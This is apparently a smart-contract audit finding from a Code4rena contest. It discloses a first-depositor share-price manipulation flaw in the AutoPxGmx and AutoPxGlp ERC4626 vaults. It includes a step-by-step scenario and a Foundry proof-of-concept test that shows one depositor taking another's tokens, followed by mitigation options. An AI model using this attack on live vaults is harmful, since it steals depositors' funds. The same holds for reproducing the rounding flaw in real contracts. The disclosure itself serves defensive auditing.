[H-05] Underlying assets stealing inAutoPxGmxandAutoPxGlpvia share price manipulation
Submitted byJeiwan, also found byseyni,gogo,pashov,hl_,rbserver,peanuts,__141345__,unforgiven,Lambda,joestakey,JohnSmith,R2,Koolex,xiaoming90,yongskiws,carrotsmuggler,ladboy233,0xSmartContract,KingNFT,cccz,HE1M,rvierdiiev,koxuan,8olidity, and0xLad
https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L156-L165
https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L167-L176
Impact
pxGMX and pxGLP tokens can be stolen from depositors inAutoPxGmxandAutoPxGlpvaults by manipulating the price of a share.
Proof of Concept
ERC4626 vaults are subject to a share price manipulation attack that allows an attacker to steal underlying tokens from other depositors (this is aknown issueof Solmate’s ERC4626 implementation). Consider this scenario (this is applicable toAutoPxGmxandAutoPxGlpvaults):
Alice is the first depositor of theAutoPxGmxvault;Alice deposits 1 wei of pxGMX tokens;in thedepositfunction (PirexERC4626.sol#L60), the amount of shares is calculated using thepreviewDepositfunction:functionpreviewDeposit(uint256assets)publicviewvirtualreturns(uint256){returnconvertToShares(assets);}functionconvertToShares(uint256assets)publicviewvirtualreturns(uint256){uint256supply=totalSupply;// Saves an extra SLOAD if totalSupply is non-zero.returnsupply==0?assets:assets.mulDivDown(supply,totalAssets());}Since Alice is the first depositor (totalSupply is 0), she gets 1 share (1 wei);Alice thensends9999999999999999999 pxGMX tokens (10e18 - 1) to the vault;The price of 1 share is 10 pxGMX tokens now: Alice is the only depositor in the vault, she’s holding 1 wei of shares, and the balance of the pool is 10 pxGMX tokens;Bob deposits 19 pxGMX tokens and gets only 1 share due to the rounding in theconvertToSharesfunction:19e18 * 1 / 10e18 == 1;Alice redeems her share and gets a half of the deposited assets, 14.5 pxGMX tokens (less the withdrawal fee);Bob redeems his share and gets only 14.5 pxGMX (less the withdrawal fee), instead of the 19 pxGMX he deposited.
// test/AutoPxGmx.t.solfunctiontestSharePriceManipulation_AUDIT()external{addressalice=address(0x31337);addressbob=address(0x12345);vm.label(alice,"Alice");vm.label(bob,"Bob");// Resetting the withdrawal fee for cleaner amounts.autoPxGmx.setWithdrawalPenalty(0);vm.startPrank(address(pirexGmx));pxGmx.mint(alice,10e18);pxGmx.mint(bob,19e18);vm.stopPrank();vm.startPrank(alice);pxGmx.approve(address(autoPxGmx),1);// Alice deposits 1 wei of pxGMX and gets 1 wei of shares.autoPxGmx.deposit(1,alice);// Alice sends 10e18-1 of pxGMX and sets the price of 1 wei of shares to 10e18 pxGMX.pxGmx.transfer(address(autoPxGmx),10e18-1);vm.stopPrank();vm.startPrank(bob);pxGmx.approve(address(autoPxGmx),19e18);// Bob deposits 19e18 of pxGMX and gets 1 wei of shares due to rounding and the price manipulation.autoPxGmx.deposit(19e18,bob);vm.stopPrank();// Alice and Bob redeem their shares.vm.prank(alice);autoPxGmx.redeem(1,alice,alice);vm.prank(bob);autoPxGmx.redeem(1,bob,bob);// Alice and Bob both got 14.5 pxGMX.// But Alice deposited 10 pxGMX and Bob deposited 19 pxGMX – thus, Alice stole pxGMX tokens from Bob.// With withdrawal fees enabled, Alice would've been penalized more than Bob// (14.065 pxGMX vs 14.935 pxGMX tokens withdrawn, respectively),// but Alice would've still gotten more pxGMX that she deposited.assertEq(pxGmx.balanceOf(alice),14.5e18);assertEq(pxGmx.balanceOf(bob),14.5e18);}
Recommended Mitigation Steps
Consider either of these options:
In thedepositfunction ofPirexERC4626, consider requiring a reasonably high minimal amount of assets during first deposit. The amount needs to be high enough to mint many shares to reduce the rounding error and low enough to be affordable to users.On the first deposit, consider minting a fixed and high amount of shares, irrespective of the deposited amount.Consider seeding the pools during deployment. This needs to be done in the deployment transactions to avoid front-running attacks. The amount needs to be high enough to reduce the rounding error.Consider sending first 1000 wei of shares to the zero address. This will significantly increase the cost of the attack by forcing an attacker to pay 1000 times of the share price they want to set. For a well-intended user, 1000 wei of shares is a negligible amount that won’t diminish their share significantly.
Picodes (judge) increased severity to High
kphed (Redacted Cartel) confirmed